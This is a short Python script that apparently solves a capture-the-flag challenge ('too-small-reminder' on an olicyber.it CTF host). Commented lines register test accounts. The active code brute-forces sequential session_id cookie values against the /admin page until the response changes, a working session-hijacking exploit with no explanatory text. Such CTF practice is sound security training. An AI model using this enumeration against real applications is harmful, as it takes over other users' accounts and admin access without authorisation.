from urllib import response
import requests
import json

### cred = json.dumps({"username": "capocc", "password": "droga"}) {'session_id': '370'}
### cred = json.dumps({"username": "capocc1", "password": "droga"}) {'session_id': '2171'}


#session = requests.Session()
#print(session.cookies.set_cookie())
#resp = session.post('http://too-small-reminder.challs.olicyber.it/register', data=cred, headers={'Content-Type': 'application/json'})
#resp = session.post('http://too-small-reminder.challs.olicyber.it/login', data=cred, headers={'Content-Type': 'application/json'})
#print(resp.cookies.get_dict())
#resp = session.get('http://too-small-reminder.challs.olicyber.it/admin')
#print(resp.content)
#print(session.cookies.get_dict())

i = 0
#while True:
resp0 = requests.get('http://too-small-reminder.challs.olicyber.it/admin', cookies={'session_id': f'{i}'})
print(resp0.content)

while True:
    resp = requests.get('http://too-small-reminder.challs.olicyber.it/admin', cookies={'session_id': f'{i}'})
    print(resp.content)
    if resp.content != resp0.content:
        break

    i += 1
